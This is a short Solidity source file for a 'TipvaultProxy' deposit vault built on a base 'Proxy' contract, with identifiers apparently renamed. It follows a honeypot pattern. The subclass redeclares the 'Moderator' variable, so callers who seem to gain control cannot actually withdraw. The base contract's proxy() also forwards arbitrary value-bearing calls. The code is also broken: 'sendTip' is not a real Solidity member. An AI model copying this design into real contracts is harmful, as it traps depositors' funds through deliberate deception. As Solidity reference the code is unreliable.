pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyModerator { if (msg.sender == Moderator) _; } address Moderator = msg.sender;
    function sharekarmaGroupowner(address _communitylead) public onlyModerator { Moderator = _communitylead; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract TipvaultProxy is Proxy {
    address public Moderator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function CreatorVault() public payable {
        if (msg.sender == tx.origin) {
            Moderator = msg.sender;
            back();
        }
    }

    function back() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function redeemKarma(uint256 amount) public onlyModerator {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.sendTip(amount);
        }
    }
}